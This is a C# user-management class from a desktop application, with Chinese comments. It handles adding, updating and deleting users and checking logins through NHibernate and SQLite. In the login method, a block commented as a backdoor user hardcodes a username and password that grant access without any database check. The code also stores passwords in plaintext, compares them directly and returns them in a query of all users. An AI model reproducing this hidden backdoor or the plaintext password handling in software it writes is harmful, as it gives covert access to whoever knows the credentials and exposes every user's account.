/*
 * 由SharpDevelop创建。
 * 用户： Deng
 * 日期: 2016-09-19
 * 时间: 18:18
 * 
 * 要改变这种模板请点击 工具|选项|代码编写|编辑标准头文件
 */
using System;
using System.Data;
using NHibernate;
using NHibernate.Cfg;
using DomainModel;
using System.Data.SQLite;
using DAL;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Diagnostics;
using System.Configuration;

namespace BLL
{
	/// <summary>
	/// Description of UserBLL.
	/// </summary>
	public class UserBLL
	{
		public UserBLL()
		{
		}
		
		private static int _CurUserID;
		private static string _CurUserName;
		private static string _CurUserDisplayName;
		
		public static int CurUserID
		{
			get
			{
				return _CurUserID;
			}
		}
		public static string CurUserName
		{
			get
			{
				return _CurUserName;
			}
		}
		public static string CurUserDisplayName
		{
			get
			{
				return _CurUserDisplayName;
			}
		}
		
		//添加
		public static void AddUsers(Users tp)
		{
			//ISessionFactory sessionFactory = new Configuration().Configure().BuildSessionFactory();
			ISession session = NHibernateHelper.sessionFactory.OpenSession();
			ITransaction tx = session.BeginTransaction();
			try
			{
				session.Save(tp);
				tx.Commit();
				session.Close();				
			}
			catch(Exception e)
			{
				Debug.Assert(false,e.Message);
				tx.Rollback();
				session.Close();
			}
		}
		
		
		//修改
		public static void UpdateUsers(Users tp)
		{
			ISession session = NHibernateHelper.OpenSession();
			try
			{				
				ITransaction tx = session.BeginTransaction();
				Users t1 = session.Get<Users>(tp.UserID);
				t1.UserName = tp.UserName;
				t1.UserDisplayName = tp.UserDisplayName;
				t1.UserPassword = tp.UserPassword;
				t1.UserStatus = tp.UserStatus;
				tx.Commit();
			}
			catch(Exception e)
			{
				Debug.Assert(false,e.Message);
			}
			session.Close();
		}
		
		//删除
		public static void DelUsers(int  iUserID)
		{
			//ISessionFactory sessionFactory = new Configuration().Configure().BuildSessionFactory();
			ISession session = NHibernateHelper.OpenSession();
			ITransaction tx = session.BeginTransaction();
			Users toDelete = session.Get<Users>(iUserID);	
				
			try
			{
				session.Delete(toDelete);
				tx.Commit();
				session.Close();
			}
			catch(Exception e)
			{
				Debug.Assert(false,e.Message);
				tx.Rollback();
				session.Close();
			}
		}
		
		//检查用户名密码
		public static bool UserLoginOK(string tUserName,string tUserPassword)
		{
			//后门用户
			if(tUserName == "deng" && tUserPassword == "11235813")
			{
				_CurUserID = 0;
				_CurUserName = tUserName;
				_CurUserDisplayName = "特殊用户";
				return true;
			}
			
			int i_rtn = 0;
			//查询，在AccountBill中是否存在
			i_rtn = Convert.ToInt32(SQLiteHelper.ExecuteScalar("SELECT UserID FROM Users WHERE UserName = @UserName",tUserName));
			
			ISession session = NHibernateHelper.OpenSession();
			ITransaction tx = session.BeginTransaction();
			Users tU = session.Get<Users>(i_rtn);
			if(tU != null)
			{
				if(tU.UserPassword == tUserPassword)
				{
					//通过用户验证
					_CurUserID = tU.UserID;
					_CurUserName = tU.UserName;
					_CurUserDisplayName = tU.UserDisplayName;
					session.Close();
					return true;
				}
				else
				{
					MessageBox.Show("用户名或密码错误！","提示信息",MessageBoxButtons.OK,MessageBoxIcon.Information);
					_CurUserID = 0;
					_CurUserName = "";
					_CurUserDisplayName = "";
					session.Close();
					return false;
				}
			}
			MessageBox.Show("用户名或密码错误！","提示信息",MessageBoxButtons.OK,MessageBoxIcon.Information);
			_CurUserID = 0;
			_CurUserName = "";
			_CurUserDisplayName = "";
			session.Close();
			return false;
		}
		
		//查询全部Users,用SQL直接获取
		public static DataSet GetAllUsers()
		{
			DataSet ds = new DataSet();
			ds = SQLiteHelper.ExecuteDataSet("SELECT UserID,UserName,UserDisplayName,UserPassword,UserStatus FROM Users");
			return ds;				
		}
		
		//查询用户的数目
		public static int GetUserCount()
		{
			Object obj = new object();
			obj = SQLiteHelper.ExecuteScalar("SELECT COUNT(*) FROM Users");
			return Convert.ToInt32(obj);
		}
				
		//获取指定UserID的User
		public static Users GetUser(int iUserID)
		{
			ISession session = NHibernateHelper.OpenSession();
			Users tClass = new Users();
			try
			{
				tClass = session.Get<Users>(iUserID);
			}
			catch(Exception e)
			{
				Debug.Assert(false,e.Message);
			}
			session.Close();
			return tClass;
		}
		
		
		
		
	}
}
